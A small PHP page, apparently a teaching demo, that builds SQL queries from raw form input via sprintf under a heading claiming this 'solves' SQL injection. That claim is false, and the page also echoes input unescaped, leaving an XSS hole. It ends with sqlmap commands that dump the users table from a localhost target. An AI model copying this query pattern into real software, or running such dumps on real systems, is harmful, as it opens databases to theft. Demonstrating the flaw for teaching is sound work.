<?php
require_once(dirname($_SERVER['DOCUMENT_ROOT']) . "/vendor/autoload.php");

/**
 * @var \PDO $connector
 */
$connector = new My\DB("myTestDb");

if (isset($_POST['search'])) {
    $query1 = sprintf("INSERT INTO `searches` SET `searchkey` = '%s', `date` = '%s'", $_POST['search'], date("Y-m-d H:i:s"));
    $query2 = sprintf("SELECT `date` FROM `searches` WHERE `searchkey` = '%s' ORDER BY `date` DESC LIMIT 1", $_POST['search']);
    
    $connector->getConnector()->query($query1);
    $result = $connector->getConnector()->query($query2);
}

?>
<style>
    i {
        font-family: 'DeJaVu Sans Mono';
    }
</style>
<h1>My search App</h1>
<h2>SQL injection solved with sprintf</h2>
<form method="post">
    <input type="text" name="search" style="width: 100%" placeholder="Search..." />
    <input type="submit" name="submitBtn" value="Search" />
</form>

<?php if (isset($_POST['search'])): ?>
    <hr />
    Last search on this term (<?= $_POST['search'] ?>) was <?= $result->fetchAll()[0]['date'] ?>

<?php endif; ?>
<hr />
SQLMap Steps
<ol>
    <li>Scan for vulnerable forms <i>./sqlmap.py -u http://localhost:666/sqlmap/example2.php --forms --batch --flush-session</i></li>
    <li>List all tables <i>./sqlmap.py -u http://localhost:666/sqlmap/example2.php --forms --tables --batch --flush-session</i></li>
    <li>Get table entries from users <i>./sqlmap.py -u http://localhost:666/sqlmap/example2.php --forms -D myTestDb -T users --dump --batch --flush-session</i></li>
</ol>
<?php include('index.php');?>